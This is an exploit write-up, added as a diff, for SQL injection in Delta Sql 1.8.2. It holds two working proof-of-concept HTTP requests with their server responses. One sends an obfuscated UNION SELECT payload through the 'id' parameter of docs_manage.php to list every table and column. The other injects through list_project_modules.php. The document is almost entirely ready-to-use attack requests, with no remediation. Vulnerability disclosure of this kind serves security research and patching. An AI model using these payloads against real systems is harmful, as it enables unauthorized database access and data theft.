@@ -1,0 +1,59 @@
+# Exploit Title: Delta Sql 1.8.2 - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-10-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://deltasql.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/deltasql/files/latest/download
+# Software Link: http://deltasql.sourceforge.net/deltasql/
+# Version: 1.8.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/docs_manage.php?id=[SQL]&version=1&hasdocs=1
+ 
+GET /[PATH]/docs_manage.php?id=1++uNiOn+seleCt+0x31,0x32,(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x),0x34,0x35--+-&version=1&hasdocs=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=ra5c0bgati64a01fag01l8hhf0
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 24 Oct 2018 00:12:57 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/list_project_modules.php?id=[SQL]&name=1
+ 
+GET /[PATH]/list_project_modules.php?id=-1%20union%20select%20null,(0x32),null--&name=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=ra5c0bgati64a01fag01l8hhf0
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 24 Oct 2018 00:08:03 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 2150
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
